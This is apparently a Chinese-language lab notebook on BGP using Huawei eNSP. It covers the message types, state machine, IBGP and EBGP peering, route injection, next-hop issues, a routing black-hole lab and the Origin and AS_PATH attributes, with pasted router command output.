用于标识无效路由 (撤销路由) 的长度信息. Withdrawn routes: 用于表明撤销的路由信息. Path attribute length: 用于标识路径属性信息长度. Path attribute: 用于标识 BGP 路由的路径属性. NLRI: 网络层可达信息. 用于传递的 BGP 路由. BGP 传递路由时, 一个 Update 报文只能携带一条路由, 或多条属性相同的路由. 导入直连路由注入 BGP, 出现 Update 报文 [R1-bgp]import-route direct 撤销路由, 出现 Update 报文 [R1-bgp]undo import-route direct Notification 报文字段 错误代码: 1. 表示消息头错误 2. 表示 open 报文错误 3. 表示 Update 报文错误 4. 表示 Keepalive 超时 5. 表示状态机错误 6. 表示终止会话. (管理员关闭, 或检测到接口 down) 子错误代码: 数据 当收到 Notification 报文后, BGP 会 down 掉邻居的会话. Route-refresh 报文字段AFI : (2B) 地址家族SAFI : (1B) 子地址家族 BGP 状态机Idle: 空闲状态, 表示 BGP 设备的初始状态. 当 BGP 进程收到 START 消息后尝试 TCP 连接, 并转入 connect 状态. Connect: 连接状态, 此时会主动与 BGP 对等体建立 TCP 会话状态, 如果 TCP 会话建立成功则会进入 openset 状态, 如果 TCP 会话建立失败则会进入 Active 状态. Active: 活动状态, 在该状态下会等待 PEER 与其建立邻居关系, 如果 TCP 会话建立成功, 则进入 openset 状态, 如果 TCP 重传计时器 (32s) 超时, 则回到 connect 状态重新建立 TCP. Openset: 在该状态下表示 BGP 的 TCP 会话已经建立成功, 并且向邻居发送 open 报文, 并等等对方的 open 报文. 如果收到对方正确的 open 报文, 则进入 openconfirm. Openconfirm: 表示对 open 报文进行了确认, 此时会向对方发送 keeepalive 报文, 如果收到了对方的 Keepalive 报文, 则进入 established 状态. Established: 表示 BGP 的会话已经建立成功, 也是 BGP 最终的稳定状态. 在该状态下可以发送 Update Keepalive route-refresh 和 notification 报文. 在任何状态下收到 Notification 报文都会直接回到 Idle 状态. [R1]display bgp peer BGP local router ID : 1.1.1.1 Local AS number : 100 Total number of peers : 1 Peers in established state : 0 Peer V AS MsgRcvd MsgSent OutQ Up/Down State PrefRcv 12.1.1.2 4 200 0 0 0 00:00:31 Idle 0[R1]display bgp peer BGP local router ID : 1.1.1.1 Local AS number : 100 Total number of peers : 1 Peers in established state : 0 Peer V AS MsgRcvd MsgSent OutQ Up/Down State Pre fRcv 12.1.1.2 4 200 1 3 0 00:00:32 OpenConfirm 0[R1]Mar 4 2024 11:58:48-08:00 R1 %%01BGP/3/STATE_CHG_UPDOWN(l)[5]:The status of the peer 12.1.1.2 changed from OPENCONFIRM to ESTABLISHED. (InstanceName=Public, StateChangeReason=Up) display bgp peer BGP 的路由BGP 的路由: BGP 协议本身无法自动发现路由, 需要将现有路由表中的路由注入 BGP 从而形成 BGP 路由.BGP 所有的路由信息会先加入到 BGP 表, 在 BGP 表中最优的路由会进入到 IP 路由表 IBGP 配置IBGP 配置: 1.AS 内通过 IGP 网络可达 2.IBGP 一般采用环回口作为 BGP 互联接口. 如果 EBGP 需要通过环回口建立 BGP PEER, 则 1. 首先通过静态路由确保环回口可达 2. 在 EBGP 中开启 BGP 多跳功能 EBGP 默认会开启直连检测功能. 开启 EBGP 多跳功能后 EBGP 会自动关闭直连检查功能. ospf 1 router-id 2.2.2.2 area 0.0.0.0 network 2.2.2.2 0.0.0.0 network 12.1.1.2 0.0.0.0 network 23.1.1.2 0.0.0.0 bgp 100 router-id 2.2.2.2 peer 1.1.1.1 as-number 100 peer 1.1.1.1 connect-interface LoopBack0 peer 3.3.3.3 as-number 100 peer 3.3.3.3 connect-interface LoopBack0[R1]bgp 100[R1-bgp]router-id 1.1.1.1[R1-bgp]peer 2.2.2.2 as-number 100[R1-bgp]dis bgp peer BGP local router ID : 1.1.1.1 Local AS number : 100 Total number of peers : 1 Peers in established state : 0 Peer V AS MsgRcvd MsgSent OutQ Up/Down State Pre fRcv 2.2.2.2 4 100 0 0 0 00:02:00 Active 0物理接口改成环回接口[R1-bgp]peer 2.2.2.2 connect-interface LoopBack 0[R2-bgp]peer 1.1.1.1 connect-interface LoopBack 0[R1-bgp]dis bgp peer BGP local router ID : 1.1.1.1 Local AS number : 100 Total number of peers : 1 Peers in established state : 1 Peer V AS MsgRcvd MsgSent OutQ Up/Down State PrefRcv 2.2.2.2 4 100 2 3 0 00:00:02 Established 0[R2-bgp]dis thbgp 100 router-id 2.2.2.2 peer 1.1.1.1 as-number 100 peer 1.1.1.1 connect-interface LoopBack0 peer 3.3.3.3 as-number 100 peer 3.3.3.3 connect-interface LoopBack0(TCP可达就可以建立peer)[R1]bgp 100[R1-bgp]peer 3.3.3.3 as-number 100[R1-bgp]peer 3.3.3.3 connect-interface LoopBack0[R3]bgp 100[R3-bgp]peer 1.1.1.1 as-path-filter[R3-bgp]peer 1.1.1.1 as-number 100[R3-bgp] peer 1.1.1.1 connect-interface LoopBack0[R1-bgp]dis bgp peer BGP local router ID : 1.1.1.1 Local AS number : 100 Total number of peers : 2 Peers in established state : 2 Peer V AS MsgRcvd MsgSent OutQ Up/Down State PrefRcv 2.2.2.2 4 100 16 17 0 00:14:50 Established 0 3.3.3.3 4 100 2 3 0 00:00:06 Established 0[R1]ip route-static 4.4.4.4 32 14.1.1.4[R4]ip route-static 1.1.1.1 32 14.1.1.1[R1]Ping -a 1.1.1.1 4.4.4.4 PING 4.4.4.4: 56 data bytes, press CTRL_C to break Reply from 4.4.4.4: bytes=56 Sequence=1 ttl=255 time=60 ms Reply from 4.4.4.4: bytes=56 Sequence=2 ttl=255 time=30 ms Reply from 4.4.4.4: bytes=56 Sequence=3 ttl=255 time=20 ms Reply from 4.4.4.4: bytes=56 Sequence=4 ttl=255 time=20 ms Reply from 4.4.4.4: bytes=56 Sequence=5 ttl=255 time=30 ms --- 4.4.4.4 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 20/32/60 ms[R4-bgp]dis th[V200R003C00]#bgp 200 peer 1.1.1.1 as-number 200 peer 1.1.1.1 connect-interface LoopBack0 peer 4.4.4.4 as-number 200 [R1-bgp]dis th[V200R003C00]#bgp 100 router-id 1.1.1.1 peer 2.2.2.2 as-number 100 peer 2.2.2.2 connect-interface LoopBack0 peer 3.3.3.3 as-number 100 peer 3.3.3.3 connect-interface LoopBack0 peer 4.4.4.4 as-number 200 peer 4.4.4.4 connect-interface LoopBack0[R1-bgp]dis bgp peer BGP local router ID : 1.1.1.1 Local AS number : 100 Total number of peers : 3 Peers in established state : 2 Peer V AS MsgRcvd MsgSent OutQ Up/Down State PrefRcv 2.2.2.2 4 100 28 29 0 00:26:00 Established 0 3.3.3.3 4 100 13 14 0 00:11:16 Established 0 4.4.4.4 4 200 0 0 0 00:00:17 Idle [R1-bgp]peer 4.4.4.4 ebgp-max-hop 2[R1-bgp]dis th[V200R003C00]#bgp 100 router-id 1.1.1.1 peer 2.2.2.2 as-number 100 peer 2.2.2.2 connect-interface LoopBack0 peer 3.3.3.3 as-number 100 peer 3.3.3.3 connect-interface LoopBack0 peer 4.4.4.4 as-number 200 peer 4.4.4.4 ebgp-max-hop 2 peer 4.4.4.4 connect-interface LoopBack0[R4-bgp]dis th[V200R003C00]#bgp 200 peer 1.1.1.1 as-number 100 peer 1.1.1.1 ebgp-max-hop 2 [R1-bgp]dis bgp peer BGP local router ID : 1.1.1.1 Local AS number : 100 Total number of peers : 3 Peers in established state : 3 Peer V AS MsgRcvd MsgSent OutQ Up/Down State PrefRcv 2.2.2.2 4 100 33 34 0 00:31:34 Established 0 3.3.3.3 4 100 18 19 0 00:16:50 Established 0 4.4.4.4 4 200 2 3 0 00:00:01 Established 0 BGP 的路由注入network 命令: 将路由表现有的路由逐条注入到 BGP 表中. 注入路由时网络号和掩码必须匹配路由表中的信息. import-route 命令: 可以将某一类路由一次性注入进 BGP 中 [R4]int LoopBack 1[R4-LoopBack1]ip add 10.4.4.4 24[R4]bgp 200[R4-bgp]network 10.4.4.0 24[R4-bgp]display bgp routing-table BGP Local router ID is 4.4.4.4 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 1 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 10.4.4.0/24 0.0.0.0 0 0 i[R4-bgp]undo network 10.4.4.0 255.255.255.0[R4]ip route-static 10.1.1.0 24 NULL 0 [R4]bgp 200[R4-bgp]network 10.1.1.0 24[R4-bgp]dis bgp routing-table BGP Local router ID is 4.4.4.4 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 1 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 10.1.1.0/24 0.0.0.0 0 0 i[R4-bgp]import-route ? direct Connected routes isis Intermediate System to Intermediate System (IS-IS) routes ospf Open Shortest Path First (OSPF) routes rip Routing Information Protocol (RIP) routes static Static routes unr User network routes[R3]ip route-static 30.1.0.0 24 NULL 0[R3]ip route-static 30.1.1.0 24 NULL 0[R3]ip route-static 30.1.2.0 24 NULL 0[R3]ip route-static 30.1.3.0 24 NULL 0[R3]bgp 100[R3-bgp]import-route static [R3-bgp]dis bgp routing-table BGP Local router ID is 3.3.3.3 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 5 Network NextHop MED LocPrf PrefVal Path/Ogn i 10.1.1.0/24 4.4.4.4 0 100 0 200i *&gt; 30.1.0.0/24 0.0.0.0 0 0 ? *&gt; 30.1.1.0/24 0.0.0.0 0 0 ? *&gt; 30.1.2.0/24 0.0.0.0 0 0 ? *&gt; 30.1.3.0/24 0.0.0.0 0 0 ?[R3-bgp]import-route ospf 1[R3-bgp]display bgp routing-table BGP Local router ID is 3.3.3.3 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 10 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 1.1.1.1/32 0.0.0.0 2 0 ? *&gt; 2.2.2.2/32 0.0.0.0 1 0 ? *&gt; 3.3.3.3/32 0.0.0.0 0 0 ? i 10.1.1.0/24 4.4.4.4 0 100 0 200i *&gt; 12.1.1.0/24 0.0.0.0 2 0 ? *&gt; 23.1.1.0/24 0.0.0.0 0 0 ? *&gt; 30.1.0.0/24 0.0.0.0 0 0 ? *&gt; 30.1.1.0/24 0.0.0.0 0 0 ? *&gt; 30.1.2.0/24 0.0.0.0 0 0 ? *&gt; 30.1.3.0/24 0.0.0.0 0 0 ?[R1]dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 20 Routes : 20 Destination/Mask Proto Pre Cost Flags NextHop Interface 1.1.1.1/32 Direct 0 0 D 127.0.0.1 LoopBack0 2.2.2.2/32 OSPF 10 1 D 12.1.1.2 GigabitEthernet0/0/0 3.3.3.3/32 OSPF 10 2 D 12.1.1.2 GigabitEthernet0/0/0 4.4.4.4/32 Static 60 0 RD 14.1.1.4 GigabitEthernet0/0/1 10.1.1.0/24 EBGP 255 0 RD 4.4.4.4 GigabitEthernet0/0/1 12.1.1.0/24 Direct 0 0 D 12.1.1.1 GigabitEthernet0/0/0 12.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 12.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 14.1.1.0/24 Direct 0 0 D 14.1.1.1 GigabitEthernet0/0/1 14.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 14.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 23.1.1.0/24 OSPF 10 2 D 12.1.1.2 GigabitEthernet0/0/0 30.1.0.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/0 30.1.1.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEtherne0/0/0 30.1.2.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/0 30.1.3.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0 BGP 路由不调优的可能性BGP 只会将 BGP 表中最优的路由加入到 IP 路由表中. BGP 路由不调优的可能性: 1.BGP 开启 BGP 同步检测功能且路由不同步.(该功能默认关闭, 且 ENSP 模拟器中无法开启) 2.BGP 路由的下一跳地址不可达, 会导致 BGP 路由失效, 造成不调优. 解决方案 1: 在 IGP 中添加对应网络的路由信息, 使下一跳地址可达. ospf 1 router-id 1.1.1.1 import-route static 解决方案 2: 更改路由的下一跳, 使其变为网络中的可达地址, 实现路由有效性 bgp 100 peer 2.2.2.2 next-hop-local &lt;R2&gt;dis bgp routing-table BGP Local router ID is 2.2.2.2 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 11 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt;i 1.1.1.1/32 3.3.3.3 2 100 0 ? *&gt;i 2.2.2.2/32 3.3.3.3 1 100 0 ? i 3.3.3.3/32 3.3.3.3 0 100 0 ? i 10.1.1.0/24 4.4.4.4 0 100 0 200i i 10.4.4.0/24 4.4.4.4 0 100 0 200i *&gt;i 12.1.1.0/24 3.3.3.3 2 100 0 ? *&gt;i 23.1.1.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.0.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.1.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.2.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.3.0/24 3.3.3.3 0 100 0 ?&lt;R2&gt;&lt;R2&gt;dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 17 Routes : 17 Destination/Mask Proto Pre Cost Flags NextHop Interface 1.1.1.1/32 OSPF 10 1 D 12.1.1.1 GigabitEthernet0/0/0 2.2.2.2/32 Direct 0 0 D 127.0.0.1 LoopBack0 3.3.3.3/32 OSPF 10 1 D 23.1.1.3 GigabitEthernet0/0/1 12.1.1.0/24 Direct 0 0 D 12.1.1.2 GigabitEthernet0/0/0 12.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 12.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 23.1.1.0/24 Direct 0 0 D 23.1.1.2 GigabitEthernet0/0/1 23.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 23.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 30.1.0.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/1 30.1.1.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEtherne0/0/1 30.1.2.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/1 30.1.3.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/1 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0&lt;R2&gt;[R1]ospf 1[R1-ospf-1]import-route static [R2]dis ip routing-tableRoute Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 20 Routes : 20 Destination/Mask Proto Pre Cost Flags NextHop Interface 1.1.1.1/32 OSPF 10 1 D 12.1.1.1 GigabitEthernet0/0/0 2.2.2.2/32 Direct 0 0 D 127.0.0.1 LoopBack0 3.3.3.3/32 OSPF 10 1 D 23.1.1.3 GigabitEthernet0/0/1 4.4.4.4/32 O_ASE 150 1 D 12.1.1.1 GigabitEthernet0/0/0 10.1.1.0/24 IBGP 255 0 RD 4.4.4.4 GigabitEthernet0/0/0 10.4.4.0/24 IBGP 255 0 RD 4.4.4.4 GigabitEthernet0/0/0 12.1.1.0/24 Direct 0 0 D 12.1.1.2 GigabitEthernet0/0/0 12.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 12.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 23.1.1.0/24 Direct 0 0 D 23.1.1.2 GigabitEthernet0/0/1 23.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 23.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 30.1.0.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/1 30.1.1.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/1 30.1.2.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/1 30.1.3.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/1 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R2][R2]dis bgp routing-table BGP Local router ID is 2.2.2.2 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 12 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt;i 1.1.1.1/32 3.3.3.3 2 100 0 ? *&gt;i 2.2.2.2/32 3.3.3.3 1 100 0 ? i 3.3.3.3/32 3.3.3.3 0 100 0 ? *&gt;i 4.4.4.4/32 3.3.3.3 1 100 0 ? *&gt;i 10.1.1.0/24 4.4.4.4 0 100 0 200i *&gt;i 10.4.4.0/24 4.4.4.4 0 100 0 200i *&gt;i 12.1.1.0/24 3.3.3.3 2 100 0 ? *&gt;i 23.1.1.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.0.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.1.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.2.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.3.0/24 3.3.3.3 0 100 0 ?[R2][R1-bgp]peer 2.2.2.2 next-hop-local[R2]dis bgp routing-table BGP Local router ID is 2.2.2.2 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 11 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt;i 1.1.1.1/32 3.3.3.3 2 100 0 ? *&gt;i 2.2.2.2/32 3.3.3.3 1 100 0 ? i 3.3.3.3/32 3.3.3.3 0 100 0 ? *&gt;i 10.1.1.0/24 1.1.1.1 0 100 0 200i *&gt;i 10.4.4.0/24 1.1.1.1 0 100 0 200i *&gt;i 12.1.1.0/24 3.3.3.3 2 100 0 ? *&gt;i 23.1.1.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.0.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.1.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.2.0/24 3.3.3.3 0 100 0 ? *&gt;i 30.1.3.0/24 3.3.3.3 0 100 0 ?[R2]dis ip routing-tableRoute Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 19 Routes : 19 Destination/Mask Proto Pre Cost Flags NextHop Interface 1.1.1.1/32 OSPF 10 1 D 12.1.1.1 GigabitEthernet0/0/0 2.2.2.2/32 Direct 0 0 D 127.0.0.1 LoopBack0 3.3.3.3/32 OSPF 10 1 D 23.1.1.3 GigabitEthernet0/0/1 10.1.1.0/24 IBGP 255 0 RD 1.1.1.1 GigabitEthernet0/0/0 10.4.4.0/24 IBGP 255 0 RD 1.1.1.1 GigabitEthernet0/0/0 12.1.1.0/24 Direct 0 0 D 12.1.1.2 GigabitEthernet0/0/0 12.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 12.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 23.1.1.0/24 Direct 0 0 D 23.1.1.2 GigabitEthernet0/0/1 23.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 23.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 30.1.0.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/1 30.1.1.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/1 30.1.2.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/1 30.1.3.0/24 IBGP 255 0 RD 3.3.3.3 GigabitEthernet0/0/1 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R2] BGP 路由通告原则 BGP 只通告最优的路由. * 表示该路由是有效的 &gt; 表示该路由是最优的 从 EBGP 对等体获取的路由会通告给所有的 BGP 对等体 (EBGP 和 IBGP). 从 IBGP 对等体获取的路由不会通告给 IBGP 对等体 (IBGP 水平分割原则, 用于防止 AS 内路由环路问题)为了防止 AS 内部分设备无法收到 BGP 路由, 可以通过配置 IBGP 全互联来解决, 但 IBGP 全互联可能会导致网络结构复杂, 例如关系数量过多等问题, 导致扩展性差, 此时可以通过 BGP 路由反射器和 BGP 联盟来简化 AS 内的拓扑结构. 从 IBGP 获取的路由, 是否通告给 EBGP 对等体取决于 BGP 的同步规则. 默认情况下同步功能关闭, 且在 ENSP 中无法手动开启, 如果开启, 则只有路由同时从 BGP 和 IGP 学习到才可以通告给 EBGP 对等体. 同步规则主要是用来防止 BGP 路由黑洞问题. BGP 路由黑洞实验R3没有5.5.5.5路由 BGP路由黑洞BGP注入OSPF[R2-ospf-1]import-route bgp [R4-ospf-1]import-route bgp或者R3运行BGP&lt;R1&gt;ping -a 1.1.1.1 5.5.5.5 PING 5.5.5.5: 56 data bytes, press CTRL_C to break Request time out Request time out Request time out Request time out Request time out --- 5.5.5.5 ping statistics --- 5 packet(s) transmitted 0 packet(s) received 100.00% packet loss&lt;R3&gt;dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 13 Routes : 13 Destination/Mask Proto Pre Cost Flags NextHop Interface 2.2.2.2/32 OSPF 10 1 D 23.1.1.2 GigabitEthernet0/0/0 3.3.3.3/32 Direct 0 0 D 127.0.0.1 LoopBack0 4.4.4.4/32 OSPF 10 1 D 34.1.1.4 GigabitEthernet0/0/1 23.1.1.0/24 Direct 0 0 D 23.1.1.3 GigabitEthernet0/0/0 23.1.1.3/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 23.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 34.1.1.0/24 Direct 0 0 D 34.1.1.3 GigabitEthernet0/0/1 34.1.1.3/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 34.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0BGP注入OSPF[R2-ospf-1]import-route bgp [R2-ospf-1]dis ospf lsdb OSPF Process 1 with Router ID 2.2.2.2 Link State Database Area: 0.0.0.0 Type LinkState ID AdvRouter Age Len Sequence Metric Router 4.4.4.4 4.4.4.4 1234 48 80000005 0 Router 2.2.2.2 2.2.2.2 15 48 80000008 0 Router 3.3.3.3 3.3.3.3 1230 60 8000000A 0 Network 34.1.1.3 3.3.3.3 1230 32 80000003 0 Network 23.1.1.2 2.2.2.2 1278 32 80000003 0 AS External Database Type LinkState ID AdvRouter Age Len Sequence Metric External 1.1.1.1 2.2.2.2 15 36 80000001 1 [R4-ospf-1]import-route bgp[R4-ospf-1]dis ospf lsdb OSPF Process 1 with Router ID 4.4.4.4 Link State Database Area: 0.0.0.0 Type LinkState ID AdvRouter Age Len Sequence Metric Router 4.4.4.4 4.4.4.4 23 48 80000006 0 Router 2.2.2.2 2.2.2.2 64 48 80000008 0 Router 3.3.3.3 3.3.3.3 1277 60 8000000A 0 Network 34.1.1.3 3.3.3.3 1277 32 80000003 0 Network 23.1.1.2 2.2.2.2 1326 32 80000003 0 AS External Database Type LinkState ID AdvRouter Age Len Sequence Metric External 5.5.5.5 4.4.4.4 23 36 80000001 1 External 1.1.1.1 2.2.2.2 63 36 80000001 1 &lt;R3&gt;dis ip routing-tableRoute Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 15 Routes : 15 Destination/Mask Proto Pre Cost Flags NextHop Interface 1.1.1.1/32 O_ASE 150 1 D 23.1.1.2 GigabitEthernet0/0/0 2.2.2.2/32 OSPF 10 1 D 23.1.1.2 GigabitEthernet0/0/0 3.3.3.3/32 Direct 0 0 D 127.0.0.1 LoopBack0 4.4.4.4/32 OSPF 10 1 D 34.1.1.4 GigabitEthernet0/0/1 5.5.5.5/32 O_ASE 150 1 D 34.1.1.4 GigabitEthernet0/0/1 23.1.1.0/24 Direct 0 0 D 23.1.1.3 GigabitEthernet0/0/0 23.1.1.3/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 23.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 34.1.1.0/24 Direct 0 0 D 34.1.1.3 GigabitEthernet0/0/1 34.1.1.3/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 34.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0[R1]ping -a 1.1.1.1 5.5.5.5 PING 5.5.5.5: 56 data bytes, press CTRL_C to break Reply from 5.5.5.5: bytes=56 Sequence=1 ttl=252 time=80 ms Reply from 5.5.5.5: bytes=56 Sequence=2 ttl=252 time=50 ms Reply from 5.5.5.5: bytes=56 Sequence=3 ttl=252 time=60 ms Reply from 5.5.5.5: bytes=56 Sequence=4 ttl=252 time=50 ms Reply from 5.5.5.5: bytes=56 Sequence=5 ttl=252 time=40 ms --- 5.5.5.5 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 40/56/80 ms BGP 属性BGP 的路由中会携带多条属性信息, 这些属性信息描述了 BGP 路由的各种特征, 可以用于 BGP 最终的选路策略. BGP 属性分类公认必遵属性 (well-know mandatory):该属性可以被所有的 BGP 设备所识别, 在 update 报文中必须携带该属性, 如果未携带, 则认为该报文错误. 公认任意属性 (well-know discretionary):该属性可以被所有的 BGP 设备所识别, 在 update 报文中可以不携带, 如果未携带, 则不认为该报文错误. 可选过渡属性 (optional transitive): 该属性可能不被 BGP 设备所识别. 如果不识别的情况下, 依旧可以传递该属性. 可选非过渡属性 (optional non-transitive): 该属性可能不被 BGP 设备所识别. 如果不识别的情况下, 不会传递该属性. 属性信息直接被忽略. Origin-codeOrigin-code : 起源代码或起源属性, 是一个公认必遵属性, 用于标识一个路由被注入进 BGP 表的方式, 在 BGP 路由传递过程中起源代码一般不会改变, 共三个值: i:IGP, 表示该路由是通过 network 命令注入 BGP 得到的 e:EGP, 表示路由通过 EGP 协议学习的, 该协议目前已经完全被 BGP 取代, 现网中几乎无法见到 ?:incomplete, 表示通过其他方式注入得到, 一般是通过 import 命令注入得到. 当去往同一个目的地存在多条起源属性不同的路由时, 如果其他条件都相同, 则按照起源代码 i 优于 e 优于? 的顺序加表. AS_PATHAS_PATH:AS 路径属性, 是一个公认必遵属性, 用于描述一个 BGP 路由所经过的 AS 路径信息, 本地始发的路由 AS_PATH 属性为空, 当路由传递给 EBGP PEER 时, 会将自身的 AS 号添加到 AS_PATH 中 AS_PATH 可以用于 BGP 的 AS 间路由防环, 当从 EBGP 接收路由时, 如果发现路由中的 AS_PATH 已经包含自身的 AS 号, 则拒绝接收该路由. 如果从不同的路径收到相同目的地的路由, 且其他属性完全相同, 此时会优选 AS - PATH 较短的路由. bestroute as-path-ignore // 通过此命令可以忽略AS-PATH长短的比较 &lt;R2&gt;dis bgp routing-table BGP Local router ID is 2.2.2.2 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 6 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 1.1.1.1/32 12.1.1.1 0 0 100i *&gt;i 5.5.5.5/32 4.4.4.4 0 100 0 300i *&gt; 10.1.0.0/24 12.1.1.1 0 0 100? *&gt; 10.1.1.0/24 12.1.1.1 0 0 100? *&gt; 10.1.2.0/24 12.1.1.1 0 0 100? *&gt; 10.1.3.0/24 12.1.1.1 0 0 100?&lt;R5&gt;dis bgp routing-table BGP Local router ID is 5.5.5.5 Status codes: * - valid, &gt; - best, d - damped, h - history, i - internal, s - suppressed, S - Stale Origin : i - IGP, e - EGP, ? - incomplete Total Number of Routes: 6 Network NextHop MED LocPrf PrefVal Path/Ogn *&gt; 